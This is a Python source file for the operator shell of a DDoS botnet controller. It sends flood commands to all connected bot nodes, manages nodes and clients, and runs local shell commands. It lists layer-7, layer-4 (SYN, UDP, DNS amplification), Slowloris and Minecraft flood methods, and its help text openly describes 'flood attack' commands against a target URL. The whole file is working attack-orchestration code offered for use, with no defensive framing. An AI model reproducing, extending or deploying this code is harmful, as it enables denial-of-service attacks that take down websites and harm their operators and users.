import json
import re
import subprocess
import shlex
from colorama import Fore, Style
from .payloads import Payloads


class Functions:
    def __init__(self, controller, shell):
        self.controller = controller
        self.shell = shell

    def send_flood(self, url, duration=30, method="GET", threads=100):
        resp, result = self.controller.send_to_all(
            Payloads.flood(url, duration, method, threads)
        )
        print(
            f"{Fore.GREEN if result is True else Fore.RED}"
            f"{'Success: Flood payload sent to all nodes' if result is True else f'Error: Failed to send flood payload: {result}'}: {url}{Style.RESET_ALL}"
        )

    def send_ping(self):
        resp, result = self.controller.send_to_all(Payloads.ping())
        print(
            f"{Fore.GREEN if result is True else Fore.RED}"
            f"{'Success: Ping sent to all nodes' if result is True else f'Error: Failed to send ping: {result}'}{Style.RESET_ALL}"
        )

    def send_status(self):
        resp, result = self.controller.send_to_all(Payloads.status())
        print(
            f"{Fore.GREEN if result is True else Fore.RED}"
            f"{'Success: Status request sent to all nodes' if result is True else f'Error: Failed to send status request: {result}'}{Style.RESET_ALL}"
        )
        return resp

    def send_sync(self):
        resp, result = self.controller.send_to_all(Payloads.sync_nodes())
        print(
            f"{Fore.GREEN if result is True else Fore.RED}"
            f"{'Success: Sync sent to all nodes' if result is True else f'Error: Failed to send sync: {result}'}{Style.RESET_ALL}"
        )
        return resp

    def send_get_clients(self):
        resp, result = self.controller.send_to_all(Payloads.get_clients())
        print(
            f"{Fore.GREEN if result is True else Fore.RED}"
            f"{'Success: Get clients sent to all nodes' if result is True else f'Error: Failed to send get clients: {result}'}{Style.RESET_ALL}"
        )
        return resp

    def send_disconnect_client(self, node_id, client_id):
        resp = self.controller.send_to(node_id, Payloads.disconnect_client(client_id))
        if not resp:
            print(f"{Fore.RED}Error: No response from node {node_id}{Style.RESET_ALL}")
            return None

        try:
            data = json.loads(resp)
            if data.get("status") == "success":
                print(
                    f"{Fore.GREEN}Success: Client {client_id} disconnected on node {node_id}{Style.RESET_ALL}"
                )
            else:
                print(
                    f"{Fore.RED}Error: Node {node_id} failed to disconnect client {client_id}: {data.get('message', 'unknown')}{Style.RESET_ALL}"
                )
            return data
        except (json.JSONDecodeError, TypeError):
            print(
                f"{Fore.RED}Error: Invalid response from node {node_id}: {resp}{Style.RESET_ALL}"
            )
            return None


class Commands:
    VALID_METHODS = {
        "L7": [
            "GET",
            "POST",
            "PUT",
            "DELETE",
            "HEAD",
            "SLOWLORIS",
            "H2RESET",
            "WS",
        ],
        "L4": [
            "ACK",
            "SYN",
            "FIN",
            "RST",
            "TCP",
            "UDP",
            "DNSAMP",
        ],
        "MC": [
            "MCHANDSHAKE",
            "MCLOGIN",
            "MCPING",
        ],
    }

    def __init__(self, controller, shell):
        self.controller = controller
        self.shell = shell
        self.functions = Functions(controller, shell)

    def _parse_arg(self, args, index, default=None, cast=str):
        try:
            return cast(args[index])
        except (IndexError, ValueError, TypeError):
            return default

    def _validate_url(self, url):
        if not url:
            return False
        url_pattern = re.compile(
            r"^(https?://)?"
            r"((?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}|"
            r"(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}"
            r"(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))"
            r"(:[0-9]+)?"
            r"(/.*)?$"
        )
        return bool(url_pattern.match(url))

    def _print_node_table(self, nodes, include_status=False):
        if not nodes:
            print(f"{Fore.YELLOW}No nodes connected{Style.RESET_ALL}")
            return
        headers = ["ID", "Address", "Port"] + (["Status"] if include_status else [])
        widths = [36, 20, 10] + ([10] if include_status else [])
        print(
            f"\nConnected Nodes:\n{' '.join(f'{h:<{w}}' for h, w in zip(headers, widths))}\n{'-' * sum(widths)}"
        )
        for node in nodes:
            node_id, host, port = node[:3]
            row = [node_id, host, str(port)]
            if include_status:
                row.append(node[3] if len(node) > 3 else "Unknown")

            print(" ".join(f"{v:<{w}}" for v, w in zip(row, widths)))

    def _print_clients_table(self, clients_by_node):
        if not clients_by_node:
            print(f"{Fore.YELLOW}No client data available{Style.RESET_ALL}")
            return

        total_clients = 0
        print(f"\nClients per Node:{Style.RESET_ALL}")
        for node_id, node_info in clients_by_node.items():
            clients = node_info.get("data", {})
            client_count = len(clients)
            total_clients += client_count

            print(
                f"\nNode ID: {Fore.CYAN}{node_id}{Style.RESET_ALL} - Total Clients: {Fore.GREEN}{client_count}{Style.RESET_ALL}"
            )
            if not clients:
                print(
                    f"  {Fore.YELLOW}No clients connected to this node{Style.RESET_ALL}"
                )
                continue

            headers = ["Client ID", "IP Address", "Port"]
            widths = [12, 20, 8]
            line = "  " + "  ".join(f"{h:<{w}}" for h, w in zip(headers, widths))
            sep = "  " + "---".join("-" * w for w in widths)

            print(line)
            print(sep)
            for client_id, info in clients.items():
                ip, port = info.get("addr", ["N/A", "N/A"])
                row = [client_id, ip, str(port)]
                print("  " + " | ".join(f"{v:<{w}}" for v, w in zip(row, widths)))

        print(
            f"\n{Fore.YELLOW}Total clients across all nodes: {Fore.GREEN}{total_clients}{Style.RESET_ALL}"
        )

    def _aggregate_clients(self, response_data):
        aggregated = {}
        if not isinstance(response_data, dict):
            return aggregated

        for node_id, node_resp in response_data.items():
            if not isinstance(node_resp, dict):
                continue

            if node_resp.get("status") != "success":
                continue

            clients = node_resp.get("data", {})
            if not isinstance(clients, dict):
                continue

            aggregated[node_id] = clients

        return aggregated

    def _count_clients(self, response_data):
        aggregated = self._aggregate_clients(response_data)
        return sum(len(clients) for clients in aggregated.values())

    def _find_clients(self, term, response_data):
        aggregated = self._aggregate_clients(response_data)
        term_lower = str(term).lower()
        found = []

        for node_id, clients in aggregated.items():
            for client_id, info in clients.items():
                ip_port = info.get("addr") if isinstance(info, dict) else None
                ip = str(ip_port[0] if ip_port and len(ip_port) > 0 else "")
                if term_lower in client_id.lower() or term_lower in ip.lower():
                    found.append((node_id, client_id, ip_port))

        return found

    def _print_client_details(self, node_id, client_id, client_info):
        print(f"\nClient details for {client_id} on node {node_id}:{Style.RESET_ALL}")
        print(
            f"  IP: {Fore.CYAN}{client_info.get('addr', ['N/A', 'N/A'])[0]}{Style.RESET_ALL}"
        )
        print(
            f"  Port: {Fore.CYAN}{client_info.get('addr', ['N/A', 'N/A'])[1]}{Style.RESET_ALL}"
        )

    def help(self, shell, args):
        if args:
            cmd_name = args[0]
            if cmd_name == "clients":
                print(
                    f"\nCommand: clients\n  Usage: clients <list|count|find|show|disconnect> [params]\n  Description: Manage connected clients across all nodes\n  Level: 2{Style.RESET_ALL}"
                )
                print(
                    "  Subcommands:\n    list                 - List all clients by node\n    count                - Total number of clients across nodes\n    find <id|ip>        - Search clients by ID or IP\n    show <client_id>    - Show details for exactly one client\n    disconnect <node_id> <client_id> - Disconnect a specific client from a node"
                )
                return

            if cmd_name == "nodes":
                print(
                    f"\nCommand: nodes\n  Usage: nodes <list|status|sync|clients|disconnect> [params]\n  Description: Manage node connections and client queries\n  Level: 2{Style.RESET_ALL}"
                )
                print(
                    "  Subcommands:\n    list                  - Show connected nodes\n    status                - Check node connectivity\n    sync                  - Synchronize node list\n    clients <...>         - Proxy to clients subcommands\n    disconnect <node_id>  - Disconnect a node"
                )
                return

            if (
                cmd_name in shell.commands
                and shell.user_level >= shell.commands[cmd_name].level
            ):
                cmd = shell.commands[cmd_name]
                print(
                    f"\nCommand: {cmd.name}\n  Usage: {cmd.usage}\n  Description: {cmd.description}\n  Level: {cmd.level}{Style.RESET_ALL}"
                )
            else:
                print(
                    f"{Fore.RED}Error: Unknown command '{cmd_name}' or insufficient permissions{Style.RESET_ALL}"
                )
            return

        print(f"\nAvailable Commands:{Style.RESET_ALL}")
        print("\nTo get detailed help for a command, use: help <command>\n")

        command_rows = [
            (
                "help",
                "help [command]",
                "Show this help message or details for one command",
                1,
            ),
            ("quit/exit", "quit | exit", "Exit the interactive shell", 1),
            ("ping", "ping", "Ping all connected nodes", 2),
            (
                "nodes",
                "nodes <list|status|sync|clients|disconnect> [node_id]",
                "Node management operations",
                2,
            ),
            (
                "clients",
                "clients <list|count|find|show|disconnect> [params]",
                "Client management across nodes",
                2,
            ),
            ("methods", "methods", "List available flood attack methods", 1),
            (
                "flood",
                "flood <url> [duration] [method] [threads]",
                "Start flood attack on a URL",
                3,
            ),
            ("!", "! <command>", "Execute a local shell command (admin only)", 3),
        ]

        for name, usage, description, level in command_rows:
            if shell.user_level >= level:
                print(
                    f"  {Fore.YELLOW}{name:<16}{Style.RESET_ALL} {usage:<40} - {description} (level {level})"
                )

        print(
            f"\nUser level: {shell.user_level} (higher level enables more commands){Style.RESET_ALL}"
        )

    def shell_exec(self, shell, args):
        if not args:
            print(f"{Fore.RED}Usage: ! <command>{Style.RESET_ALL}")
            return

        command = " ".join(args)
        try:
            proc = subprocess.run(
                shlex.split(command),
                shell=False,
                check=True,
                capture_output=True,
                text=True,
                timeout=30,
            )
            print(proc.stdout)
        except subprocess.CalledProcessError as e:
            print(
                f"{Fore.RED}Shell command failed with code {e.returncode}: {e.stderr}{Style.RESET_ALL}"
            )
        except ValueError as e:
            print(f"{Fore.RED}Invalid command syntax: {e}{Style.RESET_ALL}")
        except subprocess.SubprocessError as e:
            print(f"{Fore.RED}Error executing command: {e}{Style.RESET_ALL}")

    def flood(self, shell, args):
        url = self._parse_arg(args, 0, default=None, cast=str)
        if not self._validate_url(url):
            print(
                f"{Fore.RED}Usage: {shell.commands['flood'].usage}\nError: Invalid or missing URL{Style.RESET_ALL}"
            )
            return

        duration = self._parse_arg(args, 1, default=30, cast=int)
        method = self._parse_arg(args, 2, default="GET", cast=str).upper()
        threads = self._parse_arg(args, 3, default=100, cast=int)

        all_methods = sum(self.VALID_METHODS.values(), [])
        if method not in all_methods:
            print(
                f"{Fore.RED}Error: Invalid method '{method}'. Use 'methods' command to see valid options.{Style.RESET_ALL}"
            )
            return

        if duration <= 0 or threads <= 0:
            print(
                f"{Fore.RED}Error: Duration and threads must be positive integers.{Style.RESET_ALL}"
            )
            return

        print(
            f"\nFlood Confirmation:\n  URL:      {Fore.YELLOW}{url}{Style.RESET_ALL}\n"
            f"  Duration: {Fore.YELLOW}{duration} seconds{Style.RESET_ALL}\n"
            f"  Method:   {Fore.YELLOW}{method}{Style.RESET_ALL}\n"
            f"  Threads:  {Fore.YELLOW}{threads}{Style.RESET_ALL}\n"
        )
        confirm = input(f"Proceed? (y/N) > {Style.RESET_ALL}").strip().lower()
        if confirm not in {"y", "yes"}:
            print(f"{Fore.YELLOW}Flood cancelled{Style.RESET_ALL}")
            return

        self.functions.send_flood(url, duration, method, threads)

    def ping(self, shell, args):
        self.functions.send_ping()

    def nodes(self, shell, args):
        if not args:
            print(
                f"{Fore.RED}Usage: nodes <list/status/sync/clients/disconnect> [node_id]{Style.RESET_ALL}"
            )
            return

        subcmd = args[0].lower()
        nodes = self.controller.get_nodes()

        if subcmd == "list":
            self._print_node_table(nodes)

        elif subcmd == "status":
            if not nodes:
                print(f"{Fore.YELLOW}No nodes connected{Style.RESET_ALL}")
                return
            self.functions.send_status()

            self._print_node_table(
                [(n[0], n[1], n[2], "Connected") for n in nodes], include_status=True
            )

        elif subcmd == "sync":
            self.functions.send_sync()

        elif subcmd == "clients":
            if len(args) == 1 or args[1].lower() == "list":
                resp = self.functions.send_get_clients()
                if not isinstance(resp, dict):
                    print(
                        f"{Fore.RED}Error: Invalid clients response from nodes{Style.RESET_ALL}"
                    )
                    return
                self._print_clients_table(resp)
                return

            subcmd_client = args[1].lower()

            if subcmd_client == "count":
                resp = self.functions.send_get_clients()
                if not isinstance(resp, dict):
                    print(
                        f"{Fore.RED}Error: Invalid clients response from nodes{Style.RESET_ALL}"
                    )
                    return
                total = self._count_clients(resp)
                print(
                    f"{Fore.GREEN}Total connected clients across all nodes: {total}{Style.RESET_ALL}"
                )
                return

            if subcmd_client == "find":
                if len(args) != 3:
                    print(
                        f"{Fore.RED}Usage: clients find <client_id_or_ip>{Style.RESET_ALL}"
                    )
                    return
                term = args[2]
                resp = self.functions.send_get_clients()
                if not isinstance(resp, dict):
                    print(
                        f"{Fore.RED}Error: Invalid clients response from nodes{Style.RESET_ALL}"
                    )
                    return
                found = self._find_clients(term, resp)
                if not found:
                    print(
                        f"{Fore.YELLOW}No matching clients found for '{term}'{Style.RESET_ALL}"
                    )
                else:
                    print(
                        f"{Fore.GREEN}Found {len(found)} matching clients:{Style.RESET_ALL}"
                    )
                    for node_id, client_id, addr in found:
                        addr_str = f"{addr[0]}:{addr[1]}" if addr else "N/A"
                        print(f"  - Node {node_id}: {client_id} (addr={addr_str})")
                return

            if subcmd_client == "show":
                if len(args) != 3:
                    print(f"{Fore.RED}Usage: clients show <client_id>{Style.RESET_ALL}")
                    return
                client_id = args[2]
                resp = self.functions.send_get_clients()
                if not isinstance(resp, dict):
                    print(
                        f"{Fore.RED}Error: Invalid clients response from nodes{Style.RESET_ALL}"
                    )
                    return
                aggregated = self._aggregate_clients(resp)
                for node_id, clients in aggregated.items():
                    if client_id in clients:
                        self._print_client_details(
                            node_id, client_id, clients[client_id]
                        )
                        return
                print(
                    f"{Fore.YELLOW}Client {client_id} not found on any node{Style.RESET_ALL}"
                )
                return

            if subcmd_client == "disconnect":
                if len(args) != 4:
                    print(
                        f"{Fore.RED}Usage: clients disconnect <node_id> <client_id>{Style.RESET_ALL}"
                    )
                    return
                node_id = args[2]
                client_id = args[3]
                self.functions.send_disconnect_client(node_id, client_id)
                return

            print(
                f"{Fore.RED}Error: Unknown clients subcommand '{args[1]}'. Use clients list|count|find|show|disconnect{Style.RESET_ALL}"
            )
            return

        elif subcmd == "disconnect":
            node_id = self._parse_arg(args, 1, default=None, cast=str)
            if not node_id:
                print(f"{Fore.RED}Usage: nodes disconnect <node_id>{Style.RESET_ALL}")
                return
            if not any(n[0] == node_id for n in nodes):
                print(f"{Fore.RED}Error: Node ID {node_id} not found{Style.RESET_ALL}")
                return
            self.controller.disconnect_node(node_id)
            print(f"{Fore.GREEN}Success: Disconnected node {node_id}{Style.RESET_ALL}")

        else:
            print(
                f"{Fore.RED}Error: Unknown subcommand '{subcmd}'. Use: nodes <list/status/sync/disconnect>{Style.RESET_ALL}"
            )

    def methods(self, shell, args):
        print(f"\nAvailable Flood Methods:{Style.RESET_ALL}")
        for layer, methods in self.VALID_METHODS.items():
            print(f"  {layer}: {Fore.YELLOW}{', '.join(methods)}{Style.RESET_ALL}")

    def quit(self, shell, args):
        self.controller.shutdown()
        shell.running = False
        print(f"{Fore.YELLOW}Exiting shell...{Style.RESET_ALL}")
